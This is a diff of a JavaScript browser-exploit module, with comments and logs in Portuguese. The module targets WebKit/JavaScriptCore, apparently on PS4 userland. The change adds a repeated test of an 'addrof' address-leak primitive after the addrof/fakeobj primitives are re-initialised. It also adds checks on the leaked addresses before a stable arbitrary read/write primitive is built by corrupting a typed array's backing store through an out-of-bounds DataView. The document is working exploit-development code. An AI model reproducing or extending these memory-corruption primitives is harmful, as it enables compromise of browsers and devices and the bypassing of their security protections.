@@ -1,9 +1,10 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v121 - R81 Criar leak_target_obj antes do Reset da Primitiva)
+// js/script3/testArrayBufferVictimCrash.mjs (v122 - R82 Teste Isolado de Addrof na Fase 5)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
-// - O objeto alvo para o vazamento (leak_target_obj) será criado ANTES da re-inicialização
-//   das primitivas na Fase 5, na esperança de que seu endereço seja mantido estável
-//   no heap e a addrof_func recém-inicializada consiga recuperá-lo.
+// - Implementa um teste isolado e repetitivo da primitiva 'addrof_func' na Fase 5,
+//   para diagnosticar seu comportamento de vazamento de endereços após a re-inicialização.
+// - As fases subsequentes (construção de L/E estável, scanner) serão puladas se
+//   a addrof_func não vazar endereços válidos.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -17,7 +18,7 @@ import {
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
 // Nome do módulo atualizado para refletir a nova tentativa de correção
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v121_R81_ObjBeforeReset";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v122_R82_IsolatedAddrofTest";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -41,7 +42,7 @@ function doubleToInt64(double) {
 // =======================================================================================
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação com Objeto Alvo Criado Antes do Reset ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação com Teste Isolado de Addrof na Fase 5 ---`, "test");
 
     let final_result = {
         success: false,
@@ -63,7 +64,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     let arb_write_stable = null;
 
     // Variáveis com escopo ajustado para serem acessíveis em toda a função
-    // leak_target_obj e leak_target_addr serão declarados e inicializados MAIS CEDO
     let leak_target_obj = null;
     let leak_target_addr = null;
 
@@ -136,14 +136,13 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         // NOVO: CRIAR leak_target_obj AQUI, ANTES DO RESET DAS PRIMITIVAS
         // ============================================================================
         leak_target_obj = { f: 0xDEADBEEF, g: 0xCAFEBABE, h: 0x11223344 }; 
-        for(let i=0; i<1000; i++) { leak_target_obj[`p${i}`] = i; } // Para otimizar o tipo
+        for(let i=0; i<1000; i++) { leak_target_obj[`p${i}`] = i; } 
         logS3(`[PRE-FASE 5] Objeto alvo (leak_target_obj) criado. Propagado para ser usado após o reset das primitivas.`, "info");
-        await PAUSE_S3(50); // Pequena pausa para garantir que o objeto esteja no heap
+        await PAUSE_S3(50); 
 
         // --- PREPARANDO FASE 5: APENAS RE-INICIALIZANDO PRIMITIVAS (SEM RE-TRIGGER OOB) ---
         logS3("--- PREPARANDO FASE 5: APENAS RE-INICIALIZANDO PRIMITIVAS (SEM RE-TRIGGER OOB) ---", "critical");
         
-        // Zera as referências antigas para ajudar na coleta de lixo
         confused_array = null;
         victim_array = null;
         addrof_func = null;
@@ -155,7 +154,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
 
         logS3("Ambiente OOB existente será reutilizado. Primitivas serão re-definidas.", "good");
 
-        setupAddrofFakeobj(); // Re-cria as primitivas addrof/fakeobj no contexto EXISTENTE
+        setupAddrofFakeobj(); 
         logS3("Primitivas Addrof/Fakeobj re-inicializadas para Fase 5.", "good");
 
         // --- Warm-up do addrof/fakeobj (no ambiente existente) ---
@@ -167,21 +166,65 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         await PAUSE_S3(50); 
 
         // ============================================================================
+        // TESTE ISOLADO: addrof_func NA FASE 5
+        // ============================================================================
+        logS3("--- TESTE ISOLADO DE ADDROF NA FASE 5: Verificando vazamento de endereços... ---", "subtest");
+        let valid_addrof_found = false;
+        let leaked_addrof_val = AdvancedInt64.Zero;
+        const addrof_test_count = 10;
+        for (let i = 0; i < addrof_test_count; i++) {
+            const test_obj_addrof_phase5 = {}; // Objeto novo a cada iteração
+            const addr_test = addrof_func(test_obj_addrof_phase5);
+            logS3(`    [Addrof Test ${i + 1}/${addrof_test_count}] Endereço vazado para novo objeto {}: ${addr_test.toString(true)}`, "leak");
+
+            // Validação simples: alto bit 0x7FFF (PS4 userland) e não nulo
+            if (!addr_test.equals(AdvancedInt64.Zero) && (addr_test.high() >>> 16) === 0x7FFF) {
+                logS3(`        [Addrof Test] --> Endereço VÁLIDO provável encontrado!`, "good");
+                valid_addrof_found = true;
+                leaked_addrof_val = addr_test; // Armazena o primeiro válido
+                break; // Se encontrou um, pode parar
+            } else if (!addr_test.equals(AdvancedInt64.Zero) && addr_test.high() === 0 && addr_test.low() !== 0x1000) {
+                 logS3(`        [Addrof Test] --> Endereço não-zero, high-part zero (muito baixo?), mas não 0x1000. Pode ser válido.`, "warn");
+                 // Considerar isso como um "quase" válido para continuar testando
+                 // valid_addrof_found = true;
+                 // leaked_addrof_val = addr_test;
+                 // break;
+            }
+        }
+
+        if (!valid_addrof_found) {
+            throw new Error(`FALHA CRÍTICA: addrof_func na Fase 5 não consegue vazar endereços válidos de heap após o reset das primitivas. Todas as ${addrof_test_count} tentativas falharam.`);
+        }
+        logS3(`--- TESTE ISOLADO DE ADDROF NA FASE 5: SUCESSO! Endereço válido (${leaked_addrof_val.toString(true)}) encontrado. ---`, "good");
+        await PAUSE_S3(50);
+
+
+        // ============================================================================
         // CONSTRUÇÃO DA PRIMITIVA DE LEITURA/ESCRITA ARBITRÁRIA ESTÁVEL (CORRUPÇÃO DE BACKING STORE)
+        // (Continua somente se addrof_func for validado)
         // ============================================================================
         logS3("--- FASE 5.1: Construindo Primitiva de L/E Estável (Corrupção de Backing Store) ---", "subtest");
 
         arb_rw_array = new Uint8Array(0x1000); 
         logS3(`    arb_rw_array criado. Endereço interno será corrompido.`, "info");
 
-        // Agora, obter o endereço do leak_target_obj existente
-        leak_target_addr = addrof_func(leak_target_obj); 
+        // Obter o endereço do leak_target_obj existente (que deveria ser válido agora)
+        leak_target_addr = addrof_func(leak_target_obj); // Re-obtem o endereço. Espera-se que seja válido.
         logS3(`[Etapa 1] Endereço do objeto alvo (leak_target_obj) obtido APÓS reset da primitiva: ${leak_target_addr.toString(true)}`, "info");
+        // Verifica se leak_target_addr é válido aqui também, para evitar problemas mais tarde
+        if (leak_target_addr.equals(AdvancedInt64.Zero) || (leak_target_addr.high() >>> 16) !== 0x7FFF) {
+             throw new Error(`FALHA CRÍTICA: Endereço de leak_target_obj (${leak_target_addr.toString(true)}) é inválido mesmo após o teste isolado de addrof.`);
+        }
         
         await PAUSE_S3(250); 
 
         const arb_rw_array_ab_view_addr = addrof_func(arb_rw_array);
         logS3(`    Endereço do ArrayBufferView de arb_rw_array: ${arb_rw_array_ab_view_addr.toString(true)}`, "leak");
+        // Verifica se o endereço do ArrayBufferView é válido
+        if (arb_rw_array_ab_view_addr.equals(AdvancedInt64.Zero) || (arb_rw_array_ab_view_addr.high() >>> 16) !== 0x7FFF) {
+            throw new Error(`FALHA CRÍTICA: Endereço do ArrayBufferView (${arb_rw_array_ab_view_addr.toString(true)}) é inválido.`);
+        }
+
 
         const oob_dv = getOOBDataView();
         if (!oob_dv) throw new Error("DataView OOB não está disponível após re-inicialização.");
